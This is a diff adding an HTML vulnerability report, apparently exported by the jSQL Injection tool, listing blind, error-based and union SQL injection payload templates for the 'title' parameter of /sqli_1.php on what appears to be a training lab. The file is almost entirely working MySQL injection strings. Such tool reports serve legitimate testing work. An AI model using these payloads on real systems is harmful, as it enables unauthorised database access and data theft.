@@ -1,0 +1,102 @@
+<html>
+  <head>
+    
+  </head>
+  <body>
+    <span style="white-space: nowrap"><font face="Ubuntu Mono"># Date: 
+    2026-03-13<br style="white-space: nowrap">
+    # Tested on: Windows 11 (10.0)<br style="white-space: nowrap">
+    # Tool: jSQL Injection v0.114 (<a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a>)<br style="white-space: nowrap">
+    # Database: MySQL<br style="white-space: nowrap">
+<br style="white-space: nowrap">
+    ## Vulnerability summary</font></span><br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Blind bin</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-mxqK&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Blind bit</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-j9m9&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Unsigned:or</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or!(select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x)-~0--+-FNeY&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Unsigned:and</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'and!(select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x)-~0--+-GYXY&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:OverDouble:or</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or+1=exp(~(select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x))--+-H8Zl&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:OverDouble:and</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'and+1=exp(~(select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x))--+-wKca&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Rand:or</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or+exists(select+count(*),concat(((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)),floor(rand(0)*2))from+information_schema.tables+group+by+2)--+-uJ58&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Extractvalue</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or+1=extractvalue(0x0a,concat(0x0a,((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))))--+-Wcv7&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:OverInt:or</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'or+1=(select+2*if((select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x),4611686018427387904,4611686018427387904))--+-3l3l&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:OverInt:and</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'and+1=(select+2*if((select*from((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))x),4611686018427387904,4611686018427387904))--+-xEva&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Union</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/sqli_1.php<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>title=0000210001'union+select+1,1,1,1,1,(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>),1--+-0hLO&amp;action=search<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: security_level=0; PHPSESSID=6teh6m1nhet978rgapp383hhk1
+  </body>
+</html>
